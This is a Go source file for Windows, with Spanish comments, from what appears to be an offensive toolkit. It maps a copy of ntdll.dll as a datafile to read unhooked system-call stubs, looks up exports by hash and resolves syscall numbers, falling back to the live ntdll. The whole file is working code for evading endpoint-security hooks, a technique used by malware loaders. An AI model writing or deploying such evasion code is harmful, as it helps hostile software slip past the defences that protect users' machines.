//go:build windows && amd64

package resolver

import (
	"syscall"
	"unsafe"
)

// cleanNtdll mantiene el handle a una ntdll mapeada como datafile para leer stubs limpios.
var cleanNtdll uintptr

// mapCleanNtdll carga ntdll como datafile para leer stubs sin hooks sin ejecutarlos.
func mapCleanNtdll() uintptr {
	if cleanNtdll != 0 {
		return cleanNtdll
	}
	h, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("LoadLibraryExW").Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ntdll.dll"))),
		0,
		uintptr(0x00000002), // LOAD_LIBRARY_AS_DATAFILE
	)
	cleanNtdll = h
	return h
}

// getCleanExport devuelve la dirección de una exportación desde la ntdll limpia.
func getCleanExport(name string) uintptr {
	base := mapCleanNtdll()
	if base == 0 {
		return 0
	}
	return FindAPI(base, HashC(name))
}

// ResolveSyscallID prioriza stubs limpios y cae a la ntdll en vivo si no hay limpia.
func ResolveSyscallID(name string, live uintptr) (uint32, bool) {
	if clean := getCleanExport(name); clean != 0 {
		if sysid, ok := FindSyscallID(clean); ok {
			return sysid, true
		}
	}
	if live != 0 {
		return FindSyscallID(live)
	}
	return 0, false
}
